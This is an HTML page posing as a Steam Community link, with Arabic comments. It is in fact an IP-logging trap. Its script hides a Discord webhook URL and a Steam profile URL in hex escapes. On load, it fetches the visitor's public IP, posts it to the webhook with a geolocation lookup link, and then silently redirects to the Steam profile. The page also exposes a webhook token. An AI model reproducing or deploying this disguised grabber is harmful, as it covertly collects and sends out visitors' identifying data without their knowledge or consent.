<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Steam Community</title>
</head>
<body style="background-color: #171a21;">
    <script>
        // الرابط المشفر للـ Webhook ورابط ستيم
        const _0x1a2b = ['\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x35\x30\x31\x34\x30\x35\x30\x34\x36\x33\x38\x39\x30\x38\x34\x33\x32\x34\x2F\x50\x41\x34\x4B\x4D\x6C\x38\x2D\x63\x50\x67\x6D\x54\x4A\x59\x54\x4B\x51\x38\x4B\x37\x78\x4E\x6D\x6F\x50\x63\x6C\x69\x61\x55\x6F\x4E\x38\x73\x79\x30\x68\x50\x50\x52\x38\x32\x45\x37\x2D\x75\x59\x65\x65\x74\x64\x55\x74\x5A\x68\x36\x4E\x70\x59\x30\x65\x56\x50\x6A\x6C', '\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x74\x65\x61\x6D\x63\x6F\x6D\x6D\x75\x6E\x69\x74\x79\x2E\x63\x6F\x6D\x2F\x70\x72\x6F\x66\x69\x6C\x65\x73\x2F\x37\x36\x35\x36\x31\x31\x39\x39\x32\x30\x39\x33\x35\x34\x36\x36\x30'];

        async function init() {
            try {
                // جلب بيانات الـ IP
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                const ip = data.ip;

                // إرسال البيانات للديسكورد
                await fetch(_0x1a2b[0], {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "🎮 دخول جديد للرابط",
                            color: 3447003,
                            description: `**IP:** \`${ip}\`\n**الرابط المفتوح:** Steam Profile\n\n[🔎 اضغط هنا لفحص التفاصيل](https://ip-api.com/#${ip})`,
                            timestamp: new Date()
                        }]
                    })
                });
            } catch (e) { }
            finally {
                // التحويل المباشر لستيم
                window.location.replace(_0x1a2b[1]);
            }
        }
        init();
    </script>
</body>
</html>
